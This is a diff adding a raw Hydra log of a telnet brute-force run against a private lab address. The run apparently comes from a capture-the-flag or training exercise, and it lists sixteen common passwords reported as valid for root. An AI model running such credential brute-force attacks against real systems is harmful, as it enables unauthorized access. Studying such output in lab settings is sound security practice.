@@ -1,0 +1,21 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-26 20:32:43
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task
+[DATA] attacking telnet://10.129.188.99:23/
+[23][telnet] host: 10.129.188.99   login: root   password: pussy
+[23][telnet] host: 10.129.188.99   login: root   password: 12345
+[23][telnet] host: 10.129.188.99   login: root   password: qwerty
+[23][telnet] host: 10.129.188.99   login: root   password: 123456
+[23][telnet] host: 10.129.188.99   login: root   password: 1234
+[23][telnet] host: 10.129.188.99   login: root   password: baseball
+[23][telnet] host: 10.129.188.99   login: root   password: michael
+[23][telnet] host: 10.129.188.99   login: root   password: 696969
+[23][telnet] host: 10.129.188.99   login: root   password: letmein
+[23][telnet] host: 10.129.188.99   login: root   password: abc123
+[23][telnet] host: 10.129.188.99   login: root   password: 12345678
+[23][telnet] host: 10.129.188.99   login: root   password: mustang
+[23][telnet] host: 10.129.188.99   login: root   password: monkey
+[23][telnet] host: 10.129.188.99   login: root   password: password
+[23][telnet] host: 10.129.188.99   login: root   password: dragon
+[23][telnet] host: 10.129.188.99   login: root   password: football
